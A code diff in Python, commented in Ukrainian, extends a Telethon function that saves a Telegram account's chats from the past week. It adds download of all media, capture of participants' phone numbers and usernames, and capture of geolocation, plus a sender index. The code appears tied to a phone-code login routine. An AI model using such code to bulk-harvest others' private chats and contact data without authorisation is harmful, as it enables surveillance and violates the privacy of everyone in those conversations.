@@ -32,10 +32,15 @@ logger = logging.getLogger(__name__)
 
 async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str, base_chats_folder: str = CHAT_FOLDER):
     """
-    Створює папку з назвою номера телефону та зберігає особисті чати користувача за останні 7 днів.
+    Створює папку з назвою номера телефону та зберігає особисті чати користувача за останні 7 днів
+    разом з усіма медіафайлами та повною інформацією про відправників.
     """
     # Створюємо папку для конкретного користувача
     user_folder = base_chats_folder  # НЕ створюємо ще одну папку!
+
+    # Створюємо підпапку для медіафайлів
+    media_folder = os.path.join(user_folder, "media")
+    os.makedirs(media_folder, exist_ok=True)
 
     # Переконуємось, що папка існує
     os.makedirs(user_folder, exist_ok=True)
@@ -46,6 +51,7 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
 
     dialog_count = 0
     processed_count = 0
+    media_count = 0
 
     # Отримуємо всі діалоги
     async for dialog in client.iter_dialogs():
@@ -56,11 +62,14 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
         dialog_count += 1
         logger.info(f"Обробляємо чат #{dialog_count}: {dialog.name} (ID: {dialog.id})")
 
+        # Отримуємо інформацію про учасників чату
+        participants_info = await get_chat_participants_info(client, dialog.id)
+
         chat_messages = []
         message_count = 0
 
         try:
-            # Встановлюємо таймаут для обробки одного чату (30 секунд)
+            # Встановлюємо таймаут для обробки одного чату (5 хвилин)
             async with asyncio.timeout(300):
                 # Отримуємо повідомлення з цього чату
                 async for message in client.iter_messages(
@@ -74,20 +83,186 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
                     if message.date < date_limit:
                         break
 
-                    # Додаємо повідомлення, якщо воно в межах останніх 7 днів
+                    # Отримуємо детальну інформацію про відправника
+                    sender_info = None
+                    if message.from_id and message.from_id.user_id in participants_info:
+                        sender_info = participants_info[message.from_id.user_id]
+
+                    # Базова інформація про повідомлення
                     msg_data = {
+                        "id": message.id,
                         "date": message.date.isoformat(),
                         "sender_id": message.from_id.user_id if message.from_id else None,
                         "receiver_id": dialog.id,
                         "has_media": bool(message.media),
                         "sender_name": getattr(message.sender, 'first_name', None) or getattr(message.sender,
                                                                                               'username', 'Unknown'),
-                        "text": message.text or ""
+                        "sender_info": sender_info,  # Додаткова інформація про відправника
+                        "text": message.text or "",
+                        "message_type": "text"  # Тип за замовчуванням
                     }
+
+                    # Обробка медіафайлів (код такий самий, як у попередній версії)
+                    if message.media:
+                        media_info = {}
+
+                        # Визначаємо тип медіа та завантажуємо його
+                        if message.photo:
+                            msg_data["message_type"] = "photo"
+                            media_info["type"] = "photo"
+                            try:
+                                file_name = f"photo_{message.id}_{dialog.id}.jpg"
+                                media_path = os.path.join(media_folder, file_name)
+                                await client.download_media(message.media, media_path)
+                                media_info["path"] = file_name
+                                media_count += 1
+                                logger.info(f"Завантажено фото: {file_name}")
+                            except Exception as e:
+                                logger.error(f"Помилка завантаження фото: {e}")
+                                media_info["error"] = str(e)
+
+                        elif message.video:
+                            msg_data["message_type"] = "video"
+                            media_info["type"] = "video"
+                            try:
+                                file_name = f"video_{message.id}_{dialog.id}.mp4"
+                                media_path = os.path.join(media_folder, file_name)
+                                await client.download_media(message.media, media_path)
+                                media_info["path"] = file_name
+                                media_count += 1
+                                logger.info(f"Завантажено відео: {file_name}")
+                            except Exception as e:
+                                logger.error(f"Помилка завантаження відео: {e}")
+                                media_info["error"] = str(e)
+
+                        elif message.video_note:
+                            msg_data["message_type"] = "video_note"
+                            media_info["type"] = "video_note"
+                            try:
+                                file_name = f"video_note_{message.id}_{dialog.id}.mp4"
+                                media_path = os.path.join(media_folder, file_name)
+                                await client.download_media(message.media, media_path)
+                                media_info["path"] = file_name
+                                media_count += 1
+                                logger.info(f"Завантажено відео-кружечок: {file_name}")
+                            except Exception as e:
+                                logger.error(f"Помилка завантаження відео-кружечка: {e}")
+                                media_info["error"] = str(e)
+
+                        elif message.voice:
+                            msg_data["message_type"] = "voice"
+                            media_info["type"] = "voice"
+                            try:
+                                file_name = f"voice_{message.id}_{dialog.id}.ogg"
+                                media_path = os.path.join(media_folder, file_name)
+                                await client.download_media(message.media, media_path)
+                                media_info["path"] = file_name
+                                media_count += 1
+                                logger.info(f"Завантажено голосове повідомлення: {file_name}")
+                            except Exception as e:
+                                logger.error(f"Помилка завантаження голосового повідомлення: {e}")
+                                media_info["error"] = str(e)
+
+                        elif message.audio:
+                            msg_data["message_type"] = "audio"
+                            media_info["type"] = "audio"
+                            try:
+                                file_name = f"audio_{message.id}_{dialog.id}.mp3"
+                                media_path = os.path.join(media_folder, file_name)
+                                await client.download_media(message.media, media_path)
+                                media_info["path"] = file_name
+                                media_count += 1
+                                logger.info(f"Завантажено аудіо: {file_name}")
+                            except Exception as e:
+                                logger.error(f"Помилка завантаження аудіо: {e}")
+                                media_info["error"] = str(e)
+
+                        elif message.document:
+                            msg_data["message_type"] = "document"
+                            media_info["type"] = "document"
+                            try:
+                                file_name = f"document_{message.id}_{dialog.id}_{message.document.attributes[0].file_name if message.document.attributes else 'file'}"
+                                # Очищуємо ім'я файлу від недопустимих символів
+                                file_name = re.sub(r'[^\w\-_.]', '_', file_name)
+                                media_path = os.path.join(media_folder, file_name)
+                                await client.download_media(message.media, media_path)
+                                media_info["path"] = file_name
+                                media_count += 1
+                                logger.info(f"Завантажено документ: {file_name}")
+                            except Exception as e:
+                                logger.error(f"Помилка завантаження документа: {e}")
+                                media_info["error"] = str(e)
+
+                        elif message.sticker:
+                            msg_data["message_type"] = "sticker"
+                            media_info["type"] = "sticker"
+                            try:
+                                file_name = f"sticker_{message.id}_{dialog.id}.webp"
+                                media_path = os.path.join(media_folder, file_name)
+                                await client.download_media(message.media, media_path)
+                                media_info["path"] = file_name
+                                media_count += 1
+                                logger.info(f"Завантажено стікер: {file_name}")
+                            except Exception as e:
+                                logger.error(f"Помилка завантаження стікера: {e}")
+                                media_info["error"] = str(e)
+
+                        elif message.animation:
+                            msg_data["message_type"] = "animation"
+                            media_info["type"] = "animation"
+                            try:
+                                file_name = f"animation_{message.id}_{dialog.id}.gif"
+                                media_path = os.path.join(media_folder, file_name)
+                                await client.download_media(message.media, media_path)
+                                media_info["path"] = file_name
+                                media_count += 1
+                                logger.info(f"Завантажено анімацію: {file_name}")
+                            except Exception as e:
+                                logger.error(f"Помилка завантаження анімації: {e}")
+                                media_info["error"] = str(e)
+
+                        # Додаємо інформацію про медіа до даних повідомлення
+                        if media_info:
+                            msg_data["media"] = media_info
+
+                    # Додаємо інформацію про відповідь на повідомлення
+                    if message.reply_to:
+                        msg_data["reply_to"] = {
+                            "id": message.reply_to.reply_to_msg_id,
+                            "text": None  # Можна додати пізніше, якщо потрібно
+                        }
+
+                    # Додаємо інформацію про перешіпування повідомлень
+                    if message.fwd_from:
+                        msg_data["forwarded"] = {
+                            "from_id": message.fwd_from.from_id.user_id if message.fwd_from.from_id else None,
+                            "from_name": message.fwd_from.from_name,
+                            "date": message.fwd_from.date.isoformat() if message.fwd_from.date else None,
+                            "channel_id": message.fwd_from.channel_id
+                        }
+
+                    # Додаємо інформацію про перегляд
+                    if message.views is not None:
+                        msg_data["views"] = message.views
+
+                    # Додаємо інформацію про відповіді
+                    if message.replies:
+                        msg_data["replies"] = {
+                            "replies": message.replies.replies,
+                            "replies_pts": message.replies.replies_pts
+                        }
+
+                    # Додаємо інформацію про геолокацію
+                    if message.geo:
+                        msg_data["geo"] = {
+                            "lat": message.geo.lat,
+                            "long": message.geo.long
+                        }
+
                     chat_messages.append(msg_data)
 
-                    # Додаємо невелику затримку кожні 100 повідомлень
-                    if message_count % 100 == 0:
+                    # Додаємо невелику затримку кожні 50 повідомлень
+                    if message_count % 50 == 0:
                         await asyncio.sleep(0.1)
                         logger.info(f"  Оброблено {message_count} повідомлень...")
 
@@ -108,8 +283,23 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
             chat_filepath = os.path.join(user_folder, chat_filename)
 
             try:
+                # Створюємо структуру даних з метаданими
+                chat_data = {
+                    "chat_info": {
+                        "id": dialog.id,
+                        "name": dialog.name,
+                        "username": getattr(dialog.entity, 'username', None),
+                        "type": "user",
+                        "date_saved": datetime.now(timezone.utc).isoformat(),
+                        "messages_count": len(chat_messages),
+                        "media_count": sum(1 for msg in chat_messages if msg.get("media")),
+                        "participants": participants_info  # Інформація про учасників чату
+                    },
+                    "messages": chat_messages
+                }
+
                 with open(chat_filepath, 'w', encoding='utf-8') as f:
-                    json.dump(chat_messages, f, ensure_ascii=False, indent=4)
+                    json.dump(chat_data, f, ensure_ascii=False, indent=4)
 
                 logger.info(f"✅ Збережено {len(chat_messages)} повідомлень у файл: {chat_filename}")
                 processed_count += 1
@@ -119,7 +309,116 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
             logger.info(f"ℹ️ У чаті з {dialog.name} не знайдено повідомлень за останні 7 днів.")
 
     logger.info(
-        f"✅ Збір чатів для {phone_number} завершено. Оброблено {dialog_count} чатів, збережено {processed_count} файлів.")
+        f"✅ Збір чатів для {phone_number} завершено. Оброблено {dialog_count} чатів, збережено {processed_count} файлів, завантажено {media_count} медіафайлів.")
+
+    # Створюємо індексний файл для швидкого пошуку
+    await create_chat_index(user_folder)
+
+
+
+async def get_chat_participants_info(client: TelegramClient, dialog_id: int) -> dict:
+    """
+    Отримує інформацію про учасників чату для ідентифікації відправників
+    """
+    try:
+        participants = {}
+        async for user in client.iter_participants(dialog_id):
+            participants[user.id] = {
+                "first_name": user.first_name,
+                "last_name": user.last_name,
+                "username": user.username,
+                "phone": user.phone,
+                "is_bot": user.bot
+            }
+        return participants
+    except Exception as e:
+        logger.error(f"Помилка отримання учасників чату {dialog_id}: {e}")
+        return {}
+
+
+async def create_chat_index(user_folder: str):
+    """
+    Створює індексний файл для швидкого пошуку повідомлень
+    """
+    try:
+        index_data = {
+            "chats": [],
+            "total_messages": 0,
+            "total_media": 0,
+            "date_range": {"earliest": None, "latest": None},
+            "senders": {},
+            "message_types": {}
+        }
+
+        # Проходимо по всіх файлах чатів
+        for filename in os.listdir(user_folder):
+            if filename.endswith('.json') and filename != 'index.json':
+                filepath = os.path.join(user_folder, filename)
+
+                try:
+                    with open(filepath, 'r', encoding='utf-8') as f:
+                        chat_data = json.load(f)
+
+                    chat_info = chat_data.get('chat_info', {})
+                    messages = chat_data.get('messages', [])
+
+                    # Додаємо інформацію про чат до індексу
+                    index_data["chats"].append({
+                        "id": chat_info.get("id"),
+                        "name": chat_info.get("name"),
+                        "username": chat_info.get("username"),
+                        "messages_count": chat_info.get("messages_count", 0),
+                        "media_count": chat_info.get("media_count", 0)
+                    })
+
+                    # Оновлюємо загальні статистичні дані
+                    index_data["total_messages"] += len(messages)
+                    index_data["total_media"] += chat_info.get("media_count", 0)
+
+                    # Аналізуємо повідомлення для побудови індексу
+                    for msg in messages:
+                        msg_date = msg.get("date")
+                        if msg_date:
+                            # Оновлюємо діапазон дат
+                            if not index_data["date_range"]["earliest"] or msg_date < index_data["date_range"][
+                                "earliest"]:
+                                index_data["date_range"]["earliest"] = msg_date
+                            if not index_data["date_range"]["latest"] or msg_date > index_data["date_range"]["latest"]:
+                                index_data["date_range"]["latest"] = msg_date
+
+                        # Збираємо інформацію про відправників
+                        sender_id = msg.get("sender_id")
+                        if sender_id:
+                            if sender_id not in index_data["senders"]:
+                                index_data["senders"][sender_id] = {
+                                    "name": msg.get("sender_name", "Unknown"),
+                                    "message_count": 0,
+                                    "media_count": 0
+                                }
+                            index_data["senders"][sender_id]["message_count"] += 1
+                            if msg.get("media"):
+                                index_data["senders"][sender_id]["media_count"] += 1
+
+                        # Збираємо інформацію про типи повідомлень
+                        msg_type = msg.get("message_type", "text")
+                        if msg_type not in index_data["message_types"]:
+                            index_data["message_types"][msg_type] = 0
+                        index_data["message_types"][msg_type] += 1
+
+                except Exception as e:
+                    logger.error(f"Помилка обробки файлу {filename} для індексу: {e}")
+
+        # Зберігаємо індексний файл
+        index_path = os.path.join(user_folder, 'index.json')
+        with open(index_path, 'w', encoding='utf-8') as f:
+            json.dump(index_data, f, ensure_ascii=False, indent=4)
+
+        logger.info(f"✅ Індексний файл створено: {index_path}")
+        return True
+
+    except Exception as e:
+        logger.error(f"❌ Помилка створення індексного файлу: {e}")
+        return False
 
 
 async def send_verification_code(phone: str, api_id: int, api_hash: str, session_folder: str):
